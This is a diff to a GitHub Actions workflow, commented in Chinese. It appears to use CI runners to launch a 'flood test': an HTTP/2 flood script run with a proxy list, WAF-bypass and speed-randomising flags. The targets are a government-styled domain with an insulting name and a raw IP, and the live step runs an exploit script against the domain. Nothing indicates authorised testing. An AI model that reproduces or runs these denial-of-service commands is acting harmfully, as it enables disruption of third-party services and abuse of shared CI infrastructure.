@@ -16,7 +16,7 @@ jobs:
       # 只要阈值不满足，这一步会返回非 0，GitHub 自动标记为 failed
       - name: Run flood test (quiet)
         run: |
-          # node h2.js http://cnmdsb.sbgov.cn cc.txt 21000 80 1 1 GET --waf --mode full --random-speed --auto-switch
+          # node h2.js https://rootme.wssllhdg.dpdns.org cc.txt 21000 80 1 1 GET --waf --mode full --random-speed --auto-switch
           python3 exploit-test.py cnmdsb.sbgov.cn 443 --no-ssl
           # sudo python 12.py 103.116.247.42 80
           # python3 15.py 103.116.247.42 22 300
